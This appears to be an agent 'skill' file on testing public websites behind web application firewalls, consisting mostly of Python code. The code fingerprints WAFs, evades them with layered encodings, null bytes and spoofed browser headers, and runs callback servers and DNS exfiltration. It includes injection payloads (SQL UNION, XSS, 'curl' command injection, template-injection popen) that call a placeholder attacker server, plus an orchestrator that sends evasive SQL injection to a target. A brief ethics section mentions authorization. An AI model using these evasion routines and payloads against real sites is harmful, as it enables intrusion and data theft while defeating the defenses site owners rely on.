---
name: public-target-waf-oob
description: Public target WAF & OOB validation for handling edge defenses, blind callbacks with unique correlation tokens, and protected target testing
---

# Public Target WAF & OOB Validation

This skill provides advanced techniques for testing protected public targets, handling Web Application Firewalls (WAFs), and implementing out-of-band (OOB) validation with unique correlation tokens for blind injection detection.

## Core Concepts

### WAF Interaction and Evasion
- **WAF Fingerprinting**: Identify specific WAF implementations and rules
- **Evasion Techniques**: Bypass WAF rules through encoding, fragmentation, and timing
- **Rate Limiting**: Respect and navigate WAF rate limits
- **Behavioral Analysis**: Adapt to WAF learning modes and behavior

### Out-of-Band (OOB) Validation
- **Blind Callbacks**: Detect vulnerabilities through external callbacks
- **Correlation Tokens**: Unique identifiers to match requests to responses
- **Callback Channels**: DNS, HTTP, SMTP, and other OOB channels
- **Data Exfiltration**: Extract data through OOB channels

### Edge Defense Handling
- **CDN Bypass**: Navigate content delivery network protections
- **DDoS Protection**: Avoid triggering DDoS protection mechanisms
- **Bot Detection**: Evade bot detection and challenge-response systems
- **IP Reputation**: Manage IP reputation and blocking

## WAF Fingerprinting and Analysis

### WAF Identification
```python
import re
import httpx

class WAFFingerprinter:
    """Identify and classify WAF implementations."""
    
    WAF_SIGNATURES = {
        "Cloudflare": {
            "headers": ["cf-ray", "server: cloudflare"],
            "body_patterns": ["cloudflare", "attention required", "error 5xx"],
            "status_codes": [403, 503, 520, 521, 522, 523, 524, 525, 526, 527, 530]
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid"],
            "body_patterns": ["aws waf", "request blocked"],
            "status_codes": [403, 405]
        },
        "Akamai": {
            "headers": ["akamai-origin-hop"],
            "body_patterns": ["akamai", "access denied", "reference id"],
            "status_codes": [403, 406]
        },
        "ModSecurity": {
            "headers": ["server"],
            "body_patterns": ["modsecurity", "mod_security"],
            "status_codes": [403]
        },
        "Imperva": {
            "headers": ["x-ddos-guard"],
            "body_patterns": ["imperva", "incapsula"],
            "status_codes": [403, 406, 503]
        },
        "Barracuda": {
            "headers": ["barra_counter_session"],
            "body_patterns": ["barracuda", "blocked by barracuda"],
            "status_codes": [403]
        },
        "F5 BIG-IP ASM": {
            "headers": ["x-wa-proxy-id"],
            "body_patterns": ["f5", "big-ip", "asm"],
            "status_codes": [403, 406]
        }
    }
    
    def __init__(self):
        self.identified_wafs = []
        self.confidence_scores = {}
    
    async def fingerprint(self, target_url: str) -> dict:
        """Fingerprint WAF at target URL."""
        async with httpx.AsyncClient() as client:
            try:
                # Send probe request
                response = await client.get(
                    target_url,
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    },
                    timeout=10.0
                )
                
                waf_info = self._analyze_response(response)
                self.identified_wafs = waf_info["detected_wafs"]
                self.confidence_scores = waf_info["confidence_scores"]
                
                return waf_info
                
            except Exception as e:
                return {
                    "error": str(e),
                    "detected_wafs": [],
                    "confidence_scores": {}
                }
    
    def _analyze_response(self, response: httpx.Response) -> dict:
        """Analyze response for WAF signatures."""
        detected_wafs = []
        confidence_scores = {}
        
        response_text = response.text.lower()
        response_headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            confidence = 0.0
            
            # Check headers
            for header_signature in signatures.get("headers", []):
                header_name, header_value = header_signature.split(":", 1) if ":" in header_signature else (header_signature, "")
                if header_name in response_headers:
                    if not header_value or header_value in response_headers[header_name]:
                        confidence += 0.3
            
            # Check body patterns
            for pattern in signatures.get("body_patterns", []):
                if pattern in response_text:
                    confidence += 0.2
            
            # Check status codes
            if response.status_code in signatures.get("status_codes", []):
                confidence += 0.3
            
            # Normalize confidence
            confidence = min(confidence, 1.0)
            
            if confidence > 0.5:
                detected_wafs.append(waf_name)
                confidence_scores[waf_name] = confidence
        
        return {
            "detected_wafs": detected_wafs,
            "confidence_scores": confidence_scores,
            "status_code": response.status_code,
            "response_headers": dict(response.headers),
            "recommendations": self._get_recommendations(detected_wafs)
        }
    
    def _get_recommendations(self, detected_wafs: list) -> list:
        """Get WAF-specific recommendations."""
        recommendations = []
        
        if "Cloudflare" in detected_wafs:
            recommendations.extend([
                "Use Cloudflare-specific evasion techniques",
                "Respect rate limits (typically 1000 req/min)",
                "Consider using different IP addresses",
                "Implement proper TLS fingerprinting"
            ])
        
        if "AWS WAF" in detected_wafs:
            recommendations.extend([
                "Use AWS-specific IP ranges",
                "Implement proper request formatting",
                "Consider AWS WAF rule bypass techniques",
                "Monitor for AWS-specific block patterns"
            ])
        
        if "ModSecurity" in detected_wafs:
            recommendations.extend([
                "Identify specific ModSecurity rules",
                "Use rule-specific evasion techniques",
                "Consider alternate encoding methods",
                "Test with different HTTP methods"
            ])
        
        if not detected_wafs:
            recommendations.append("No WAF detected, but still use safe testing practices")
        
        return recommendations
```

## OOB Validation with Correlation Tokens

### Correlation Token Manager
```python
import secrets
import string
from typing import Dict, Optional
from datetime import datetime, timedelta

class CorrelationTokenManager:
    """Manage unique correlation tokens for OOB validation."""
    
    def __init__(self):
        self.active_tokens: Dict[str, dict] = {}
        self.token_length = 16
        self.token_expiry = timedelta(hours=1)
    
    def generate_token(self, context: Optional[dict] = None) -> str:
        """Generate a unique correlation token."""
        token = secrets.token_urlsafe(self.token_length)
        
        self.active_tokens[token] = {
            "created_at": datetime.utcnow(),
            "context": context or {},
            "used": False,
            "callback_received": False,
            "callback_data": None
        }
        
        return token
    
    def validate_token(self, token: str) -> bool:
        """Validate if token exists and is still valid."""
        if token not in self.active_tokens:
            return False
        
        token_data = self.active_tokens[token]
        
        # Check expiry
        if datetime.utcnow() - token_data["created_at"] > self.token_expiry:
            del self.active_tokens[token]
            return False
        
        return True
    
    def mark_callback_received(self, token: str, callback_data: dict) -> None:
        """Mark token as having received a callback."""
        if token in self.active_tokens:
            self.active_tokens[token]["callback_received"] = True
            self.active_tokens[token]["callback_data"] = callback_data
            self.active_tokens[token]["used"] = True
    
    def get_token_status(self, token: str) -> Optional[dict]:
        """Get status of a correlation token."""
        if token in self.active_tokens:
            return self.active_tokens[token]
        return None
    
    def cleanup_expired_tokens(self) -> int:
        """Clean up expired tokens."""
        expired_tokens = []
        now = datetime.utcnow()
        
        for token, data in self.active_tokens.items():
            if now - data["created_at"] > self.token_expiry:
                expired_tokens.append(token)
        
        for token in expired_tokens:
            del self.active_tokens[token]
        
        return len(expired_tokens)
    
    def generate_dns_token(self, subdomain: str = "oob") -> str:
        """Generate a DNS-friendly correlation token."""
        token = self.generate_token()
        return f"{token}.{subdomain}.example.com"
    
    def generate_http_callback_url(self, base_url: str, endpoint: str = "callback") -> str:
        """Generate an HTTP callback URL with correlation token."""
        token = self.generate_token()
        return f"{base_url}/{endpoint}?token={token}"
```

### OOB Callback Handler
```python
from typing import Callable, Any
import asyncio
from aiohttp import web

class OOBCallbackHandler:
    """Handle OOB callbacks for vulnerability validation."""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port
        self.token_manager = CorrelationTokenManager()
        self.callback_handlers: Dict[str, Callable] = {}
        self.app = web.Application()
        self._setup_routes()
        self.runner = None
        self.site = None
    
    def _setup_routes(self):
        """Setup HTTP routes for callback handling."""
        self.app.router.add_get("/callback", self.handle_http_callback)
        self.app.router.add_post("/callback", self.handle_http_callback)
        self.app.router.add_get("/dns", self.handle_dns_callback_simulation)
    
    async def handle_http_callback(self, request: web.Request) -> web.Response:
        """Handle incoming HTTP callback."""
        token = request.query.get("token")
        callback_data = {
            "method": request.method,
            "headers": dict(request.headers),
            "body": await request.text(),
            "query_params": dict(request.query),
            "client_ip": request.remote,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        if token and self.token_manager.validate_token(token):
            self.token_manager.mark_callback_received(token, callback_data)
            
            # Call custom handler if registered
            if token in self.callback_handlers:
                try:
                    await self.callback_handlers[token](callback_data)
                except Exception as e:
                    print(f"Callback handler error: {e}")
            
            return web.Response(text="Callback received", status=200)
        
        return web.Response(text="Invalid token", status=400)
    
    async def handle_dns_callback_simulation(self, request: web.Request) -> web.Response:
        """Handle simulated DNS callback (for testing)."""
        # In production, this would be handled by a DNS server
        token = request.query.get("token")
        if token and self.token_manager.validate_token(token):
            callback_data = {
                "type": "dns",
                "query": request.query.get("query", ""),
                "timestamp": datetime.utcnow().isoformat()
            }
            self.token_manager.mark_callback_received(token, callback_data)
            return web.Response(text="DNS callback recorded", status=200)
        
        return web.Response(text="Invalid token", status=400)
    
    async def start(self) -> None:
        """Start the OOB callback server."""
        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        self.site = web.TCPSite(self.runner, self.host, self.port)
        await self.site.start()
        print(f"OOB callback server started on {self.host}:{self.port}")
    
    async def stop(self) -> None:
        """Stop the OOB callback server."""
        if self.runner:
            await self.runner.cleanup()
            print("OOB callback server stopped")
    
    def register_callback_handler(self, token: str, handler: Callable) -> None:
        """Register a custom handler for a specific token."""
        self.callback_handlers[token] = handler
    
    def wait_for_callback(self, token: str, timeout: float = 60.0) -> bool:
        """Wait for callback with timeout."""
        import time
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if token in self.token_manager.active_tokens:
                if self.token_manager.active_tokens[token]["callback_received"]:
                    return True
            time.sleep(0.5)
        
        return False
```

## WAF Evasion Techniques

### Encoding and Obfuscation
```python
import base64
import urllib.parse
import codecs

class WAFEvasionTechniques:
    """Collection of WAF evasion techniques."""
    
    @staticmethod
    def url_encode(payload: str, encoding: str = "utf-8") -> str:
        """URL encode payload."""
        return urllib.parse.quote(payload, encoding=encoding)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode for evasion."""
        first_encode = urllib.parse.quote(payload)
        return urllib.parse.quote(first_encode)
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode payload."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode payload."""
        return payload.encode().hex()
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode payload."""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """Mix multiple encoding techniques."""
        # First base64 encode
        encoded = base64.b64encode(payload.encode()).decode()
        # Then URL encode
        encoded = urllib.parse.quote(encoded)
        # Add unicode characters
        encoded = encoded.replace("%", "\\u00")
        return encoded
    
    @staticmethod
    def comment_obfuscation(payload: str) -> str:
        """Add SQL comment obfuscation."""
        return payload.replace(" ", "/**/").replace("(", "/**/(")
    
    @staticmethod
    def case_variation(payload: str) -> str:
        """Randomize character case."""
        result = []
        for char in payload:
            if char.isalpha():
                result.append(char.upper() if random.random() > 0.5 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def fragment_payload(payload: str, fragment_size: int = 8) -> list:
        """Fragment payload into smaller pieces."""
        return [payload[i:i+fragment_size] for i in range(0, len(payload), fragment_size)]
    
    @staticmethod
    def add_null_bytes(payload: str) -> str:
        """Add null bytes for evasion."""
        return payload.replace(" ", "\x00")
    
    @staticmethod
    def tab_separation(payload: str) -> str:
        """Use tabs instead of spaces."""
        return payload.replace(" ", "\t")
    
    @staticmethod
    def alternate_whitespace(payload: str) -> str:
        """Alternate between different whitespace characters."""
        whitespace_chars = [' ', '\t', '\n', '\r', '\x0b', '\x0c']
        result = []
        for char in payload:
            if char == ' ':
                result.append(random.choice(whitespace_chars))
            else:
                result.append(char)
        return ''.join(result)
```

### HTTP Header Manipulation
```python
class HeaderManipulation:
    """HTTP header manipulation for WAF evasion."""
    
    COMMON_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
    ]
    
    @staticmethod
    def get_random_user_agent() -> str:
        """Get a random user agent string."""
        return random.choice(HeaderManipulation.COMMON_USER_AGENTS)
    
    @staticmethod
    def add_common_headers(headers: dict) -> dict:
        """Add common headers to appear more legitimate."""
        enhanced_headers = headers.copy()
        
        if "User-Agent" not in enhanced_headers:
            enhanced_headers["User-Agent"] = HeaderManipulation.get_random_user_agent()
        
        if "Accept" not in enhanced_headers:
            enhanced_headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        
        if "Accept-Language" not in enhanced_headers:
            enhanced_headers["Accept-Language"] = "en-US,en;q=0.9"
        
        if "Accept-Encoding" not in enhanced_headers:
            enhanced_headers["Accept-Encoding"] = "gzip, deflate, br"
        
        if "Connection" not in enhanced_headers:
            enhanced_headers["Connection"] = "keep-alive"
        
        if "Upgrade-Insecure-Requests" not in enhanced_headers:
            enhanced_headers["Upgrade-Insecure-Requests"] = "1"
        
        return enhanced_headers
    
    @staticmethod
    def add_security_headers(headers: dict) -> dict:
        """Add security-related headers."""
        enhanced_headers = headers.copy()
        
        enhanced_headers["Sec-Fetch-Dest"] = "document"
        enhanced_headers["Sec-Fetch-Mode"] = "navigate"
        enhanced_headers["Sec-Fetch-Site"] = "none"
        enhanced_headers["Sec-Fetch-User"] = "?1"
        enhanced_headers["Cache-Control"] = "max-age=0"
        
        return enhanced_headers
    
    @staticmethod
    def add_trust_headers(headers: dict) -> dict:
        """Add headers that may increase trust scores."""
        enhanced_headers = headers.copy()
        
        enhanced_headers["DNT"] = "1"
        enhanced_headers["Sec-CH-UA"] = '"Chromium";v="91", " Not;A Brand";v="99"'
        enhanced_headers["Sec-CH-UA-Mobile"] = "?0"
        
        return enhanced_headers
```

## Blind Injection Detection

### DNS Exfiltration
```python
class DNSExfiltration:
    """DNS-based data exfiltration for blind injection detection."""
    
    def __init__(self, callback_handler: OOBCallbackHandler):
        self.callback_handler = callback_handler
        self.max_label_length = 63  # DNS label length limit
        self.max_subdomain_length = 253  # DNS subdomain length limit
    
    def generate_dns_payload(self, data: str, token: str) -> str:
        """Generate DNS payload for data exfiltration."""
        # Encode data in base32 for DNS compatibility
        import base64
        encoded_data = base64.b32encode(data.encode()).decode().lower()
        
        # Split into chunks that fit DNS label length limits
        chunks = self._split_into_chunks(encoded_data, self.max_label_length)
        
        # Build DNS hostname
        dns_name = ".".join(chunks) + f".{token}.example.com"
        
        return dns_name
    
    def _split_into_chunks(self, data: str, chunk_size: int) -> list:
        """Split data into chunks of specified size."""
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    async def exfiltrate_via_dns(self, target_domain: str, data: str) -> str:
        """Attempt to exfiltrate data via DNS."""
        token = self.callback_handler.token_manager.generate_token({"method": "dns"})
        dns_payload = self.generate_dns_payload(data, token)
        
        # Simulate DNS resolution (in production, actual DNS queries would be made)
        # This is a placeholder for actual DNS exfiltration logic
        print(f"DNS exfiltration payload: {dns_payload}")
        
        return token
```

### HTTP Callback Detection
```python
class HTTPCallbackDetection:
    """HTTP callback detection for blind injection."""
    
    def __init__(self, callback_handler: OOBCallbackHandler):
        self.callback_handler = callback_handler
    
    def generate_callback_payload(self, injection_point: str, token: str) -> str:
        """Generate payload that triggers HTTP callback."""
        callback_url = self.callback_handler.token_manager.generate_http_callback_url(
            "http://your-server.com", "callback"
        )
        
        # Common injection patterns
        payloads = {
            "sql": f"1' UNION SELECT 1,2,3,'{callback_url}'--",
            "xss": f"<script src='{callback_url}'></script>",
            "ssrf": f"http://{callback_url}",
            "cmd_injection": f"; curl {callback_url}",
            "template_injection": f"{{{{config.__init__.__globals__['os'].popen('curl {callback_url}').read()}}}}"
        }
        
        return payloads.get(injection_point, callback_url)
    
    async def wait_for_detection(self, token: str, timeout: float = 60.0) -> bool:
        """Wait for callback detection."""
        return self.callback_handler.wait_for_callback(token, timeout)
```

## Rate Limiting and Timing Strategies

### Rate Limit Management
```python
import asyncio
from typing import Callable

class RateLimitManager:
    """Manage rate limiting for protected targets."""
    
    def __init__(self, requests_per_second: float = 2.0):
        self.requests_per_second = requests_per_second
        self.request_times = []
        self.lock = asyncio.Lock()
    
    async def acquire(self) -> None:
        """Acquire rate limit permission."""
        async with self.lock:
            now = asyncio.get_event_loop().time()
            
            # Remove old request times
            self.request_times = [t for t in self.request_times if now - t < 1.0]
            
            # Check if we need to wait
            if len(self.request_times) >= self.requests_per_second:
                sleep_time = 1.0 / self.requests_per_second
                await asyncio.sleep(sleep_time)
            
            self.request_times.append(now)
    
    async def execute_with_rate_limit(self, func: Callable, *args, **kwargs) -> Any:
        """Execute function with rate limiting."""
        await self.acquire()
        return await func(*args, **kwargs)
    
    def get_current_rate(self) -> float:
        """Get current request rate."""
        if not self.request_times:
            return 0.0
        
        now = asyncio.get_event_loop().time()
        recent_requests = [t for t in self.request_times if now - t < 1.0]
        return len(recent_requests)
```

### Timing Analysis
```python
class TimingAnalyzer:
    """Analyze timing patterns for blind injection detection."""
    
    def __init__(self, baseline_samples: int = 10):
        self.baseline_samples = baseline_samples
        self.baseline_times = []
        self.significance_threshold = 2.0  # Standard deviations
    
    async def establish_baseline(self, func: Callable) -> float:
        """Establish baseline timing for legitimate requests."""
        times = []
        for _ in range(self.baseline_samples):
            start = asyncio.get_event_loop().time()
            await func()
            end = asyncio.get_event_loop().time()
            times.append(end - start)
        
        self.baseline_times = times
        return sum(times) / len(times)
    
    def is_significant_delay(self, execution_time: float) -> bool:
        """Determine if execution time is significantly different from baseline."""
        if not self.baseline_times:
            return False
        
        baseline_mean = sum(self.baseline_times) / len(self.baseline_times)
        baseline_std = (sum((t - baseline_mean) ** 2 for t in self.baseline_times) / len(self.baseline_times)) ** 0.5
        
        if baseline_std == 0:
            return execution_time > baseline_mean + 0.1  # 100ms threshold
        
        z_score = (execution_time - baseline_mean) / baseline_std
        return abs(z_score) > self.significance_threshold
```

## Integration and Orchestration

### Complete OOB Testing Workflow
```python
class PublicTargetTester:
    """Complete workflow for testing protected public targets."""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.waf_fingerprinter = WAFFingerprinter()
        self.callback_handler = OOBCallbackHandler()
        self.rate_limiter = RateLimitManager(requests_per_second=3.0)
        self.evasion = WAFEvasionTechniques()
        self.timing_analyzer = TimingAnalyzer()
    
    async def setup(self) -> None:
        """Setup testing infrastructure."""
        await self.callback_handler.start()
        waf_info = await self.waf_fingerprinter.fingerprint(self.target_url)
        print(f"WAF Detection Results: {waf_info}")
    
    async def test_blind_sqli(self, injection_point: str) -> dict:
        """Test for blind SQL injection using OOB."""
        token = self.callback_handler.token_manager.generate_token({
            "test_type": "blind_sqli",
            "injection_point": injection_point
        })
        
        callback_url = self.callback_handler.token_manager.generate_http_callback_url(
            "http://your-server.com", "callback"
        )
        
        # Generate evasive SQL injection payload
        base_payload = f"1' UNION SELECT 1,2,3,'{callback_url}'--"
        evasive_payload = self.evasion.mixed_encoding(base_payload)
        
        # Execute with rate limiting
        async def execute_injection():
            async with httpx.AsyncClient() as client:
                headers = HeaderManipulation.add_common_headers({})
                headers = HeaderManipulation.add_security_headers(headers)
                
                response = await self.rate_limiter.execute_with_rate_limit(
                    client.get,
                    self.target_url,
                    params={injection_point: evasive_payload},
                    headers=headers,
                    timeout=30.0
                )
                return response
        
        try:
            await execute_injection()
            
            # Wait for callback
            callback_received = await self.callback_handler.wait_for_callback(token, timeout=60.0)
            
            return {
                "success": callback_received,
                "token": token,
                "payload": evasive_payload,
                "callback_data": self.callback_handler.token_manager.get_token_status(token)
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "token": token
            }
    
    async def test_timing_based_sqli(self, injection_point: str) -> dict:
        """Test for timing-based SQL injection."""
        # Establish baseline
        async def baseline_request():
            async with httpx.AsyncClient() as client:
                await client.get(self.target_url, timeout=10.0)
        
        baseline_time = await self.timing_analyzer.establish_baseline(baseline_request)
        print(f"Baseline response time: {baseline_time:.3f}s")
        
        # Test with time-based payload
        time_payload = f"1' AND IF(1=1, SLEEP(5), 0)--"
        evasive_payload = self.evasion.comment_obfuscation(time_payload)
        
        async def timing_request():
            async with httpx.AsyncClient() as client:
                headers = HeaderManipulation.add_common_headers({})
                start = asyncio.get_event_loop().time()
                await self.rate_limiter.execute_with_rate_limit(
                    client.get,
                    self.target_url,
                    params={injection_point: evasive_payload},
                    headers=headers,
                    timeout=30.0
                )
                end = asyncio.get_event_loop().time()
                return end - start
        
        execution_time = await timing_request()
        is_significant = self.timing_analyzer.is_significant_delay(execution_time)
        
        return {
            "success": is_significant,
            "execution_time": execution_time,
            "baseline_time": baseline_time,
            "payload": evasive_payload,
            "is_significant": is_significant
        }
    
    async def cleanup(self) -> None:
        """Cleanup testing infrastructure."""
        await self.callback_handler.stop()
        expired_tokens = self.callback_handler.token_manager.cleanup_expired_tokens()
        print(f"Cleaned up {expired_tokens} expired tokens")
```

## Best Practices

### 1. WAF Interaction
- **Respect Rate Limits**: Always implement proper rate limiting
- **Fingerprint First**: Identify WAF before attempting evasion
- **Gradual Escalation**: Start with basic techniques before advanced evasion
- **Monitor Responses**: Watch for WAF learning and adaptation

### 2. OOB Validation
- **Unique Tokens**: Always use unique correlation tokens
- **Token Management**: Implement proper token lifecycle management
- **Multiple Channels**: Use multiple OOB channels when possible
- **Callback Security**: Secure callback endpoints against abuse

### 3. Ethical Considerations
- **Authorization Only**: Only test authorized targets
- **Minimal Impact**: Use techniques that minimize impact
- **Rate Limiting**: Respect operational boundaries
- **Disclosure**: Follow responsible disclosure practices

### 4. Operational Security
- **Infrastructure Security**: Secure OOB callback infrastructure
- **Data Protection**: Protect any data collected during testing
- **Logging**: Maintain detailed logs for analysis
- **Cleanup**: Properly cleanup testing artifacts

## Pro Tips

1. **Start Passive**: Begin with passive reconnaissance before active testing
2. **Profile Behavior**: Understand normal behavior before detecting anomalies
3. **Multiple Vectors**: Use multiple detection methods for validation
4. **Context Awareness**: Adapt techniques based on application context
5. **Rate Awareness**: Be mindful of rate limits and WAF thresholds
6. **Token Hygiene**: Regularly cleanup expired correlation tokens
7. **Fallback Planning**: Have multiple fallback strategies ready
8. **Documentation**: Document all WAF signatures and evasion techniques
9. **Continuous Learning**: Update techniques based on new WAF developments
10. **Respect Boundaries**: Always stay within authorized scope and rate limits

## Summary

Public target WAF & OOB validation provides sophisticated techniques for testing protected applications while respecting operational boundaries. The combination of WAF fingerprinting, intelligent evasion, OOB validation with correlation tokens, and rate-aware testing enables effective security assessment of defended targets.